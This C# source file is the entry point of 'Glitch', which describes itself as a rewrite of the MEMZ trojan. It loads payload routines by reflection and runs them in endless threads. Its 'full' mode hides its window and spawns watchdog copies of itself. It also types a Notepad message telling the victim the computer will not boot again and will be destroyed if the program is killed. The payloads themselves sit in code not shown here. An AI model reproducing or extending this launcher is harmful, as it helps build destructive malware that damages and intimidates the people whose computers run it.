#define Watch_Dogs

using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using GlitchPayloads;
#if Watch_Dogs
using System.Diagnostics;
using CC_Functions.W32;

#endif

namespace Glitch
{
    public class Program
    {
        public static List<Tuple<MethodInfo, PayloadAttribute>>? payloads;

        public static void Main(string[] args)
        {
#if Watch_Dogs
            if (args.Length == 1 && args[0] == "wd")
            {
                WatchDog.Run();
                return;
            }
#endif
            args = args == null || args.Length == 0
                ? new[] {"form"}
                : args.Select(s => s.ToLower().TrimStart('-', '/', '\\')).ToArray();
            payloads = Assembly.GetAssembly(typeof(PayloadClassAttribute)).GetTypes()
                .Where(s => s.IsClass &&
                            s.GetCustomAttributes(false).Any(a => a is PayloadClassAttribute))
                .SelectMany(s => s.GetMethods()).Where(s =>
                    !s.GetParameters().Any(q => true) && s.GetCustomAttributes(false).Any(a => a is PayloadAttribute))
                .OrderBy(s => s.GetPayloadName())
                .Select(s => new Tuple<MethodInfo, PayloadAttribute>(s,
                    (PayloadAttribute) s.GetCustomAttributes(false).First(a => a is PayloadAttribute))).ToList();
            switch (args[0])
            {
                case "form":
                    Common.TimePassed = float.PositiveInfinity;
                    Common.DelayMultiplier = 0.25f;
                    Application.Run(new RunGUI());
                    break;
                case "list":
                    Console.WriteLine(
                        string.Join(Environment.NewLine, payloads.Select(s => s.Item1.GetPayloadName())));
                    break;
                case "full":
                    ShowNotepad();
                    payloads.ForEach(s => LaunchRunner(s.Item1, s.Item2));
                    LaunchIncrementor();
#if Watch_Dogs
                    Wnd32.fromHandle(Process.GetCurrentProcess().MainWindowHandle).shown = false;
                    for (int i = 0; i < WatchDog.WDC; i++)
                        Process.Start(Process.GetCurrentProcess().MainModule.FileName, "wd");
#else
                    ShowKill();
#endif
                    break;
                case "run":
                    Console.WriteLine("Using payloads:");
                    payloads.Where(s => args.Skip(1).Any(a => s.Item1.GetPayloadName().ToLower() == a)).ToList()
                        .ForEach(
                            s =>
                            {
                                Console.WriteLine($"- {s.Item1.GetPayloadName()}");
                                LaunchRunner(s.Item1, s.Item2);
                            });
                    LaunchIncrementor();
                    ShowKill();
                    break;
                case "help":
                    ShowHelp();
                    break;
                default:
                    Console.WriteLine("Invalid operator");
                    ShowHelp();
                    break;
            }
        }

        private static void ShowKill()
        {
            Console.WriteLine("Press [ENTER] to kill");
            Console.ReadLine();
            Environment.Exit(0);
        }

        public static void ShowHelp()
        {
            Console.WriteLine("CC24 - Glitch - an (incomplete) rewrite of Leurak's MEMZ in C#"
#if DEBUG
                              + " - DEBUG BUILD"
#endif
            );
            Console.WriteLine("Usage: Glitch <command> [parameters]");
            Console.WriteLine("");
            Console.WriteLine("Commands:");
            Console.WriteLine("-   form: Shows a GUI to customize payloads (Memz Clean). Default.");
            Console.WriteLine("-   help: Displays this message");
            Console.WriteLine("-   list: Lists all payloads");
            Console.WriteLine("-   run:  Run only the payloads specified in parameters");
#if Watch_Dogs
            Console.WriteLine("-   full: Runs all payloads. Includes Watchdogs");
#else
            Console.WriteLine("-   full: Runs all payloads");
#endif
#if Watch_Dogs
            Console.WriteLine("-   wd:   This is used internally and should never be used from outside");
#endif
        }

        public static void ShowNotepad()
        {
            Process proc = Process.Start("notepad.exe");
            proc.WaitForInputIdle();
            Wnd32.fromHandle(proc.MainWindowHandle).isForeground = true;
            const string msg =
                "YOUR COMPUTER HAS BEEN FUCKED BY GLITCH,\nA REWRITE OF THE MEMZ TROJAN.\n\nYour computer won't boot up again,\nso use it as long as you can!\n\n:D\n\nTrying to kill GLITCH will cause your system to be\ndestroyed instantly, so don't try it :D";
            SendKeys.SendWait(msg);
        }

        public static void LaunchIncrementor()
        {
            new Thread(() =>
            {
                Thread.Sleep(1000);
                Common.TimePassed++;
                Common.DelayMultiplier = Math.Max(240 / Common.TimePassed, float.Epsilon);
            }).Start();
        }

        public static void LaunchRunner(MethodInfo method, PayloadAttribute data) => GetRunner(method, data).Start();

        public static Thread GetRunner(MethodInfo method, PayloadAttribute data) =>
            new Thread(() =>
            {
                while (data.RunAfter < Common.TimePassed) Thread.Sleep(1000);
                while (true)
                {
                    method.Invoke(null, new object[0]);
                    Thread.Sleep(Math.Max((int) (data.DefaultDelay * Common.DelayMultiplier), 50));
                }
            });
    }
}

//TODO: Function to build custom payload collections
//TODO: Test BSOD
//TODO: Test payloads
//TODO: Use custom runner in form